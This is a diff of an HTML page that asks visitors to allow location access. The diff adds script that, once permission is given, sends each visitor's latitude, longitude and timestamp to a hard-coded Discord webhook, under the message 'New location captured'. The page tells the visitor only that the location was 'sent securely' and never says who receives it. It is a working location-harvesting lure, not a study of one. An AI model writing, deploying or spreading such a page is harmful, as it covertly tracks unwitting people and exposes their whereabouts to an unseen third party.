@@ -1,56 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Location Access Required</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Location Access</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1600&q=80') no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(5px);
     }
-    .container {
-      background-color: white;
+
+    .card {
+      background: rgba(255, 255, 255, 0.9);
       padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      display: inline-block;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      animation: fadeIn 0.8s ease-out;
     }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #222;
+    }
+
+    p {
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 30px;
+    }
+
     button {
-      padding: 10px 20px;
+      background-color: #4A90E2;
+      color: white;
+      border: none;
+      padding: 12px 24px;
       font-size: 16px;
+      border-radius: 8px;
       cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #357ABD;
+    }
+
+    #status {
       margin-top: 20px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h2>To continue, please allow access to your location.</h2>
-    <button onclick="requestLocation()">Allow Location Access</button>
-    <p id="status"></p>
+  <div class="card">
+    <h2>Location Access Required</h2>
+    <p>To continue, please click the button below and allow location access.</p>
+    <button onclick="requestLocation()">Allow Location</button>
+    <div id="status"></div>
   </div>
 
   <script>
     function requestLocation() {
+      const status = document.getElementById("status");
+      status.textContent = "Requesting location...";
+
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           function(position) {
-            document.getElementById("status").textContent =
-              "Location access granted. Latitude: " + position.coords.latitude +
-              ", Longitude: " + position.coords.longitude;
-            // You can redirect or continue your logic here
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            status.textContent = "✅ Location access granted. Continuing...";
+
+            // Send data to Discord webhook
+            fetch("https://discord.com/api/webhooks/1361350377001193543/qZvxgb0Nd6JTHusv4eGNVJm8Ooq4OQSz1p_rJkqAnUrERwOH0JlDfQ3qTmUA8xaFYhZQ", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                content: `📍 New location captured:\nLatitude: ${latitude}\nLongitude: ${longitude}\nTime: ${new Date().toLocaleString()}`
+              })
+            }).then(() => {
+              status.textContent = "✔️ Location sent securely.";
+              // Redirect or continue after sending
+              // window.location.href = "/next-page.html"; // optional
+            }).catch((err) => {
+              status.textContent = "❌ Error sending location.";
+              console.error("Webhook error:", err);
+            });
+
           },
           function(error) {
-            document.getElementById("status").textContent = 
-              "Location access denied or unavailable.";
+            status.textContent = "❌ Failed to get location or permission denied.";
           }
         );
       } else {
-        document.getElementById("status").textContent =
-          "Geolocation is not supported by this browser.";
+        status.textContent = "🚫 Geolocation is not supported by this browser.";
       }
     }
   </script>
